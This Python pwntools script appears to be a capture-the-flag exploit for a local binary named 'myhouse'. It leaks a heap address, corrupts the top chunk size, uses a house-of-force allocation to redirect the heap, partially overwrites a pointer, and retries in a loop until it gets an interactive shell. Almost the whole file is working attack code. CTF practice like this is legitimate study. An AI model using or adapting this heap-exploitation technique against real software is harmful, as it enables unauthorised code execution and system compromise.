#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import sys

elf = ""
libc = ""
env = ""
LOCAL = 1
context.log_level = "debug"

while 1:
    p = process("./myhouse", env={"LD_PRELOAD":"./libc_64.so"})
    p.recvuntil("name?\n")
    p.send("x"*0x20)
    p.recvuntil("house?\n")
    p.send("b"*0xf0 + p64(0) + p64(0xffffffffffffffff))
    p.recvuntil("house?\n")
    p.sendline(str(0x300000 + 0x3c4b78+0xff1))
    p.recvuntil("Too large!\n")
    p.sendline(str(0x300000))
    p.recvuntil("description:")
    p.send("test")
    p.recvuntil("choice:\n")
    def buildroom(length):

        p.sendline("1")
        p.recvuntil("room?\n")
        p.send(str(length))
        p.recvuntil("choice:\n")

    def decorate(data):

        p.sendline("2")
        p.recvuntil("shining!\n")
        p.send(data)
        p.recvuntil("choice:\n")

    def view():

        p.sendline("3")
        data = p.recvuntil("choice:\n")
        return data

    #leak heap
    data = view()
    heap = data.split("x"*0x20)[1][:4]
    heap_addr = u32(heap)
    target = (heap_addr & 0xffffff00) + 0x100
    print hex(target)
    target_addr = 0xffffffffffffffff
    #house of force.
    quant = (target_addr - target+0x602010) & 0x000000ffffffffff
    print str(quant)
    try:
        buildroom(quant)
    except:
        p.close()
        continue
    buildroom(0x40)
    decorate(p64(0) + "\x17\x51")
    try:
        p.interactive()
    except:
        p.close()
        continue

